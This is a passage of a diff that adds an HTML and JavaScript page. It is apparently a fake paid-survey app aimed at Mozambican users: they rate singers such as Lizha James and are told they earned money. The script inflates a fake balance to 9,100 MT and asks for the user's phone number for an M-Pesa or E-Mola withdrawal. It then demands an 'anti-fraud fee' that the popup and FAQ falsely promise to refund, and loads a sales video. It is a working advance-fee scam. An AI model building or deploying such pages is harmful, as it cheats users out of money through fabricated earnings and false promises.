+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            700 MT
+        </span>
+    </div>
+
+    <!-- Anuncio 4 - Lizha James -->
+    <div class="outer-box" id="ad4" style="display: none;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 950 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/Lizha James.jpg" style="width: 80%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas de Lizha James?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria a cantora Lizha James para seus amigos e familiares?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta a cantora Lizha James?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B4" onclick="showLoadingB4();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B4 -->
+    <div class="popup-container" id="popupB4">
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            950 MT
+        </span>
+    </div>
+
+    <!-- Anuncio 5 - Liloca -->
+    <div class="outer-box" id="ad5" style="display: none;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 850 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/Liloca.jpg" style="width: 80%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas de Liloca?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria a cantora Liloca para seus amigos e familiares?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta a cantora Liloca?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B5" onclick="showLoadingB5();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B5 -->
+    <div class="popup-container" id="popupB5">
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            850 MT
+        </span>
+    </div>
+
+    <!-- Anuncio 6 - Mc Roger -->
+    <div class="outer-box" id="ad6" style="display: none;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 750 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/Mc Roger.jpg" style="width: 85%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas de Mc Roger?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria o cantor Mc Roger para seus amigos e familiares?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor Mc Roger?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B6" onclick="showLoadingB6();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B6 -->
+    <div class="popup-container" id="popupB6">
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            750 MT
+        </span>
+    </div>
+
+    <!-- Anuncio 7 - Hot Blaze -->
+    <div class="outer-box" id="ad7" style="display: none;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 900 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/Hot Blaze.jpeg" style="width: 75%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas de Hot Blaze?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria o cantor Hot Blaze para seus amigos e familiares?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor Hot Blaze?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B7" onclick="showLoadingB7();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B7 -->
+    <div class="popup-container" id="popupB7">
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            900 MT
+        </span>
+    </div>
+
+    <!-- Anuncio 8 - Dama do Bling -->
+    <div class="outer-box" id="ad8" style="display: none;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 750 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/Dama do Bling.jpg" style="width: 80%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas da Dama do Bling?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria a cantora Dama do Bling para seus amigos e familiares?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta a cantora Dama do Bling?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B8" onclick="showLoadingB8();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B8 -->
+    <div class="popup-container" id="popupB8">
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            750 MT
+        </span>
+    </div>
+
+    <!-- Anuncio 9 - Dygo Boy -->
+    <div class="outer-box" id="ad9" style="display: none;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 750 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/Dygo Boy.jpg" style="width: 80%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas de Dygo Boy?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria o cantor Dygo Boy para seus amigos e familiares?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor Dygo Boy?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B9" onclick="showLoadingB9();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B9 -->
+    <div class="popup-container" id="popupB9">
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            750 MT
+        </span>
+    </div>
+
+    <!-- Anuncio 10 - Laylizzy -->
+    <div class="outer-box" id="ad10" style="display: none;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 750 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/Laylizzy.jpg" style="width: 80%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas de Laylizzy?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria o cantor Laylizzy para seus amigos e familiares?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor Laylizzy?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B10" onclick="showLoadingB10();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B10 -->
+    <div class="popup-container" id="popupB10">
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            750 MT
+        </span>
+    </div>
+
+    <!-- Limite atingido -->
+    <div class="popup-containerL" id="popupL">
+        <div id="container-progresso" style="display: flex; margin: 0 auto; width: 300px; height: 300px;">
+            <svg id="barra-progresso-svg" viewBox="0 0 36 36">
+                <circle cx="18" cy="18" fill="none" r="16" stroke="#ccc" stroke-width="3"></circle>
+                <circle cx="18" cy="18" fill="none" id="minha-barra-progresso" r="16" stroke="#06B32E" stroke-dasharray="0 1000" stroke-width="3"></circle>
+            </svg>
+            <div id="texto-progresso">
+                <span id="valor-saque" style="font-family: 'Montserrat', sans-serif; font-size: 23px;">1000 MT</span>
+                <span style="font-family: 'Montserrat', sans-serif; color: #202020; font-size: 14px;">Seu saldo subiu!</span>
+            </div>
+        </div>
+        <p style="font-family: 'Montserrat', sans-serif; font-size: 32px; color: #28a745; text-align: center; margin-top: 15px; margin-bottom: -5px;">
+            Parabens!
+        </p>
+        <p class="popup-textL" style="margin-bottom: 20px; font-size: 18px; color: #636363">
+            Voce atingiu seu<br>limite diario!
+        </p>
+        <button class="desbloquear-button" onclick="mostrarPagina('saque')" style="font-weight: bold; font-size: 18px; border-radius: 12px; margin-top: 15px;">
+            SAQUE AGORA
+        </button>
+    </div>
+
+    <div style="margin-bottom: 80px;"></div>
+
+    <!-- Menu debaixo -->
+    <div class="menuemb">
+        <a href="#" onclick="mostrarPagina('saque')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">paid</span>
+        </a>
+        <a href="#" onclick="mostrarPagina('inicio')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">home</span>
+        </a>
+        <a href="#" onclick="mostrarPagina('bonus')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">help</span>
+        </a>
+    </div>
+</div>
+
+<!-- Pagina Saque -->
+<div id="saque" style="display: none;">
+    <div class="menu">
+        <a style="width: 30%;"><img src="images/opinilogo.png" style="width: 110px;"></a>
+    </div>
+
+    <div style="margin-bottom: 100px;"></div>
+
+    <div class="outer-box">
+        <div class="valor-box-saque">
+            <p style="font-size: 16px; margin-bottom: 15px; text-align: center; color: rgb(101, 101, 101);">Seu saldo</p>
+            <span id="valor-money" style="font-size: 45px; text-align: center; font-family: 'Montserrat', sans-serif; letter-spacing: -2px; color: #06B32E;">
+                1000 MT
+            </span>
+        </div>
+    </div>
+
+    <p style="margin-bottom: 18px; margin-top: 23px; color: rgb(101, 101, 101); text-align: center; font-weight: bold;">
+        Selecione como deseja levantar
+    </p>
+
+    <div class="button-container" id="payMethods">
+        <button class="square-button" type="button">
+            <img alt="M-Pesa" src="images/mpesa250.png">
+        </button>
+        <button class="square-button" type="button">
+            <img alt="E-Mola" src="images/emola250.png">
+        </button>
+    </div>
+
+    <div style="margin-bottom: 15px;"></div>
+
+    <input class="form-input" id="chave-pix" name="chave-pix" placeholder="Digite seu numero de telefone" type="text">
+    <input class="form-input" id="quantia" name="quantia" placeholder="Digite o valor que deseja levantar" style="margin-top: 15px;" type="text">
+    <button class="desbloquear-button" onclick="showPopup()" style="font-weight: bold; font-size: 18px; border-radius: 12px; margin-top: 15px;">
+        REALIZAR LEVANTAMENTO
+    </button>
+
+    <!-- TAXA DESBLOQUEIO -->
+    <div class="popup-container" id="popup">
+        <span class="popup-text" style="font-size: 20px; font-weight: bold;">DESBLOQUEAR SEU SALDO</span>
+        <div style="margin-bottom: 20px;"></div>
+        <p class="popup-text" style="padding-left: 5%; padding-right: 5%; text-align: justify;">
+            Usamos uma taxa anti-fraudes, para evitar fraudes e abuso dos levantamentos que estavam ocorrendo dentro do sistema.<br><br>
+            Fique tranquilo, voce recebera o valor da taxa de volta junto ao valor do seu levantamento, e apenas uma etapa de validamento de que voce seria um humano e nao um robo.
+        </p>
+        <div style="margin-bottom: 20px;"></div>
+        <button class="desbloquear-button" style="font-weight: bold;" onclick="mostrarPagina('video')">
+            DESBLOQUEAR AGORA
+        </button>
+    </div>
+
+    <div style="margin-bottom: 40px;"></div>
+
+    <!-- Menu debaixo -->
+    <div class="menuemb">
+        <a href="#" onclick="mostrarPagina('saque')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">paid</span>
+        </a>
+        <a href="#" onclick="mostrarPagina('inicio')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">home</span>
+        </a>
+        <a href="#" onclick="mostrarPagina('bonus')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">help</span>
+        </a>
+    </div>
+</div>
+
+<!-- Pagina Bonus (FAQ) -->
+<div id="bonus" style="display: none;">
+    <div class="menu">
+        <a style="width: 30%;"><img src="images/opinilogo.png" style="width: 110px;"></a>
+    </div>
+
+    <div style="margin-bottom: 90px;"></div>
+    <div style="margin-bottom: 110px;"></div>
+
+    <p class="faq-title">Perguntas frequentes</p>
+
+    <div class="faq-container">
+        <div class="faq-item">
+            <div class="question" onclick="toggleAnswer(this)">Preciso pagar a taxa toda vez?</div>
+            <div class="answer">Não! A taxa seria paga somente a primeira vez, para confirmar que você é um humano, e não um robô. Você receberá o estorno do valor da taxa após o primeiro saque</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="question" onclick="toggleAnswer(this)">Por que existe a taxa?</div>
+            <div class="answer">Serve como uma etapa anti-fraude, para evitar fraudes e abusos dos saques que estavam ocorrendo na plataforma! Mas não precisa se preocupar, você receberá o valor da taxa de volta junto ao valor do seu saque; seria apenas uma etapa de validação de que você é humano e não um robô.</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="question" onclick="toggleAnswer(this)">Em quanto tempo vou receber?</div>
+            <div class="answer">Você receberá seu saque dentro de 24 horas, da mesma forma que você receberá seu saque teste!</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="question" onclick="toggleAnswer(this)">Quantas vezes posso sacar por dia?</div>
+            <div class="answer">Quantos você quiser, mas existe uma quantidade limitada de códigos que temos acesso por dia!</div>
+        </div>
+
+        <div class="faq-item">
+            <div class="question" onclick="toggleAnswer(this)">Como usa o aplicativo?</div>
+            <div class="answer">É muito simples de usar! Basta responder às perguntas sobre as empresas no menu principal e, por fim, clicar no botão de 'Enviar respostas'. Quando enviar, você já receberá seu dinheiro pela tarefa realizada!</div>
+        </div>
+    </div>
+
+    <div style="margin-bottom: 150px;"></div>
+
+    <!-- Menu debaixo -->
+    <div class="menuemb">
+        <a href="#" onclick="mostrarPagina('saque')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">paid</span>
+        </a>
+        <a href="#" onclick="mostrarPagina('inicio')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">home</span>
+        </a>
+        <a href="#" onclick="mostrarPagina('bonus')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">help</span>
+        </a>
+    </div>
+</div>
+
+<!-- Pagina Video -->
+<div id="video" class="video-page" style="display: none;">
+    <div class="video-header">
+        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
+    </div>
+
+    <div class="saldo-display">
+        <img src="images/opinilogo.png" alt="Spotify Logo">
+        <div class="saldo-box">
+            <div class="saldo-label">SALDO</div>
+            <div class="saldo-valor" id="valor-video">9,100.00 MT</div>
+        </div>
+    </div>
+
+    <div class="video-section">
+        <h2 class="video-title">DESBLOQUEIO DE SALDO</h2>
+        <p class="video-subtitle">
+            Veja como liberar seu saque assistindo ao vídeo.
+        </p>
+
+        <div class="video-container" id="video-player-container">
+            <!-- O player será inserido aqui dinamicamente -->
+        </div>
+    </div>
+</div>
+
+<script>
+    const inicioDiv = document.getElementById('inicio');
+    const saqueDiv = document.getElementById('saque');
+    const loginDiv = document.getElementById('login');
+    const bonusDiv = document.getElementById('bonus');
+    const videoDiv = document.getElementById('video');
+    let videoPlayerLoaded = false;
+
+    function carregarVideoPlayer() {
+        if (videoPlayerLoaded) return;
+
+        const container = document.getElementById('video-player-container');
+
+        const playerElement = document.createElement('vturb-smartplayer');
+        playerElement.id = 'vid-690b1c9b1f060d76594b616f';
+        playerElement.style.cssText = 'display: block; margin: 0 auto; width: 100%;';
+        container.appendChild(playerElement);
+
+        const script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.src = 'https://scripts.converteai.net/9d93e4b2-3654-4bea-bda0-107c1328d520/players/690b1c9b1f060d76594b616f/v4/player.js';
+        script.async = true;
+        document.head.appendChild(script);
+
+        videoPlayerLoaded = true;
+    }
+
+    function playAudio() {
+        var audio = document.getElementById("meuAudio");
+        audio.play();
+    }
+
+    function setCookie(cname, cvalue, exdays) {
+        const d = new Date();
+        d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+        const expires = `expires=${d.toUTCString()}`;
+        document.cookie = `${cname}=${cvalue}; ${expires}; path=/`;
+    }
+
+    function getCookie(cname) {
+        const name = `${cname}=`;
+        const decodedCookie = decodeURIComponent(document.cookie);
+        const ca = decodedCookie.split(';');
+        for (let i = 0; i < ca.length; i++) {
+            let c = ca[i];
+            while (c.charAt(0) === ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) === 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return '';
+    }
+
+    let valor = parseFloat(getCookie('valor')) || 1000.00;
+    const valorSpan = document.getElementById('valor');
+    const valorSpanSaque = document.getElementById('valor-saque');
+    const valorSpanMoney = document.getElementById('valor-money');
+    const valorSpanVideo = document.getElementById('valor-video');
+
+    function atualizarValor() {
+        valorSpan.textContent = `${valor.toFixed(2)} MT`;
+        valorSpanSaque.textContent = `${valor.toFixed(2)} MT`;
+        valorSpanMoney.textContent = `${valor.toFixed(2)} MT`;
+        valorSpanVideo.textContent = `${valor.toFixed(2)} MT`;
+        setCookie('valor', valor.toFixed(2), 365);
+    }
+
+    atualizarValor();
+
+    const valoresDesejados = [800, 900, 700, 950, 850, 750, 900, 750, 750, 750];
+
+    function aumentarValor() {
+        if (valoresDesejados.length > 0) {
+            const valorIncremento = valoresDesejados.shift();
+            valor += valorIncremento;
+            atualizarValor();
+            verificarValor();
+        }
+    }
+
+    function mostrarPagina(pagina) {
+        inicioDiv.style.display = pagina === 'inicio' ? 'block' : 'none';
+        saqueDiv.style.display = pagina === 'saque' ? 'block' : 'none';
+        loginDiv.style.display = pagina === 'login' ? 'block' : 'none';
+        bonusDiv.style.display = pagina === 'bonus' ? 'block' : 'none';
+        videoDiv.style.display = pagina === 'video' ? 'block' : 'none';
+
+        if (pagina === 'video') {
+            carregarVideoPlayer();
+        }
+    }
+
+    function trocarDiv(esconderId, mostrarId) {
+        document.getElementById(esconderId).style.display = 'none';
+        document.getElementById(mostrarId).style.display = 'block';
+    }
+
+    atualizarValor();
+
+    function showPopupB1() {
+        document.getElementById('B1').disabled = true;
+        document.getElementById('popupB1').style.display = 'block';
+    }
+
+    function closePopupB1() {
+        document.getElementById('popupB1').style.display = 'none';
+        document.getElementById('B1').disabled = true;
+    }
+
+    function showLoadingB1() {
+        showPopupB1();
+        playAudio();
+        setTimeout(function () {
+            closePopupB1();
+            aumentarValor();
+            trocarDiv('ad1', 'ad2');
+        }, 4000);
+    }
+
+    function showPopupB2() {
+        document.getElementById('popupB2').style.display = 'block';
+        document.getElementById('B2').disabled = true;
+    }
+
+    function closePopupB2() {
+        document.getElementById('popupB2').style.display = 'none';
+        document.getElementById('B2').disabled = true;
+    }
+
+    function showLoadingB2() {
+        showPopupB2();
+        playAudio();
+        setTimeout(function () {
+            closePopupB2();
+            aumentarValor();
+            trocarDiv('ad2', 'ad3');
+        }, 4000);
+    }
+
+    function showPopupB3() {
+        document.getElementById('popupB3').style.display = 'block';
+        document.getElementById('B3').disabled = true;
+    }
+
+    function closePopupB3() {
+        document.getElementById('popupB3').style.display = 'none';
+        document.getElementById('B3').disabled = true;
+    }
+
+    function showLoadingB3() {
+        showPopupB3();
+        playAudio();
+        setTimeout(function () {
+            closePopupB3();
+            aumentarValor();
+            trocarDiv('ad3', 'ad4');
+        }, 4000);
+    }
+
+    function showPopupB4() {
+        document.getElementById('popupB4').style.display = 'block';
+        document.getElementById('B4').disabled = true;
+    }
+
+    function closePopupB4() {
+        document.getElementById('popupB4').style.display = 'none';
+        document.getElementById('B4').disabled = true;
+    }
+
+    function showLoadingB4() {
+        showPopupB4();
+        playAudio();
+        setTimeout(function () {
+            closePopupB4();
+            aumentarValor();
+            trocarDiv('ad4', 'ad5');
+        }, 4000);
+    }
+
+    function showPopupB5() {
+        document.getElementById('popupB5').style.display = 'block';
+        document.getElementById('B5').disabled = true;
+    }
+
+    function closePopupB5() {
+        document.getElementById('popupB5').style.display = 'none';
+        document.getElementById('B5').disabled = true;
+    }
+
+    function showLoadingB5() {
+        showPopupB5();
+        playAudio();
+        setTimeout(function () {
+            closePopupB5();
+            aumentarValor();
+            trocarDiv('ad5', 'ad6');
+        }, 4000);
+    }
+
+    function showPopupB6() {
+        document.getElementById('popupB6').style.display = 'block';
+        document.getElementById('B6').disabled = true;
+    }
+
+    function closePopupB6() {
+        document.getElementById('popupB6').style.display = 'none';
+        document.getElementById('B6').disabled = true;
+    }
+
+    function showLoadingB6() {
+        showPopupB6();
+        playAudio();
+        setTimeout(function () {
+            closePopupB6();
+            aumentarValor();
+            trocarDiv('ad6', 'ad7');
+        }, 4000);
+    }
+
+    function showPopupB7() {
+        document.getElementById('popupB7').style.display = 'block';
+        document.getElementById('B7').disabled = true;
+    }
+
+    function closePopupB7() {
+        document.getElementById('popupB7').style.display = 'none';
+        document.getElementById('B7').disabled = true;
+    }
+
+    function showLoadingB7() {
+        showPopupB7();
+        playAudio();
+        setTimeout(function () {
+            closePopupB7();
+            aumentarValor();
+            trocarDiv('ad7', 'ad8');
+        }, 4000);
+    }
+
+    function showPopupB8() {
+        document.getElementById('popupB8').style.display = 'block';
+        document.getElementById('B8').disabled = true;
+    }
+
+    function closePopupB8() {
+        document.getElementById('popupB8').style.display = 'none';
+        document.getElementById('B8').disabled = true;
+    }
+
+    function showLoadingB8() {
+        showPopupB8();
+        playAudio();
+        setTimeout(function () {
+            closePopupB8();
+            aumentarValor();
+            trocarDiv('ad8', 'ad9');
+        }, 4000);
+    }
+
+    function showLoadingB9() {
+        document.getElementById('popupB9').style.display = 'block';
+        playAudio();
+        setTimeout(function () {
+            document.getElementById('popupB9').style.display = 'none';
+            aumentarValor();
+            trocarDiv('ad9', 'ad10');
+        }, 4000);
+    }
+
+    function showLoadingB10() {
+        document.getElementById('popupB10').style.display = 'block';
+        playAudio();
+        setTimeout(function () {
+            document.getElementById('popupB10').style.display = 'none';
+            aumentarValor();
+        }, 4000);
+    }
+
+    let activeButton = null;
+
+    function toggleButton(buttonNumber) {
+        const buttons = document.querySelectorAll('.square-button');
+        if (activeButton !== null) {
+            buttons[activeButton - 1].classList.remove('active');
+        }
+        if (activeButton === buttonNumber) {
+            activeButton = null;
+        } else {
+            buttons[buttonNumber - 1].classList.add('active');
+            activeButton = buttonNumber;
+        }
+    }
+
+    function showPopup() {
+        document.getElementById('popup').style.display = 'block';
+    }
+
+    function closePopup() {
+        document.getElementById('popup').style.display = 'none';
+    }
+
+    function showPopupL() {
+        document.getElementById('popupL').style.display = 'block';
+    }
+
+    function closePopupL() {
+        document.getElementById('popupL').style.display = 'none';
+    }
+
+    let popupMostrado = false;
+
+    function verificarValor() {
+        if (!popupMostrado && valor >= 9100) {
+            showPopupL();
+            popupMostrado = true;
+        }
+    }
+
+    function showLoading() {
+        var button = document.getElementById("prosseguir-button");
+        button.disabled = true;
